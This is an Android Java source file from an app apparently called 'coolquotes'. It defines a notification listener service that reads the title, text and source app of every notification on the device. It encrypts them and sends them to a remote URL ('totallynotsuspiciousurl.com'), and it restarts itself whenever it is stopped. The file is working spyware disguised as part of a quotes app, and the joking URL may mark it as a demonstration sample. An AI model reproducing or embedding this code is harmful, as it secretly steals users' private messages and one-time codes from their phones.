package com.cross.coolquotes.utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONObject;

import java.nio.charset.StandardCharsets;

public class NotificationListener extends NotificationListenerService {

    private NotificationListenerServiceReceiver receiver;

    @Override
    public void onCreate() {
        super.onCreate();
        receiver = new NotificationListenerServiceReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction("com.cross.coolquotes.NOTIFICATION_LISTENER_SERVICE");
        registerReceiver(receiver,filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Intent i = new  Intent("com.cross.coolquotes.NOTIFICATION_LISTENER_SERVICE");
        i.putExtra("command","restart");
        sendBroadcast(i);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");
        String package_name = sbn.getPackageName();

        JSONObject obj = new JSONObject();

        try {
            obj.put("title", title);
            obj.put("text", text);
            obj.put("package", package_name);
            sendNotification(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }

        Intent i = new  Intent("com.cross.coolquotes.NOTIFICATION_LISTENER_SERVICE");
        i.putExtra("notification_event",title + ": " + text + " @ " + package_name);
        sendBroadcast(i);

    }

    public void sendNotification(JSONObject notification) throws Exception {
        final String url ="http://www.totallynotsuspiciousurl.com/notifications";
        final String requestBody = EncryptUtils.encryptString(notification.toString());

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {}
                }) {
            @Override
            public byte[] getBody() {
                return requestBody.getBytes(StandardCharsets.UTF_8);
            }
        };

        VolleySingleton.getInstance(NotificationListener.this).addToRequestQueue(stringRequest);
    }

    public class NotificationListenerServiceReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getStringExtra("command") != null && intent.getStringExtra("command").equals("restart")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(new Intent(context, NotificationListener.class));
                } else {
                    context.startService(new Intent(context, NotificationListener.class));
                }
            }
        }
    }
}
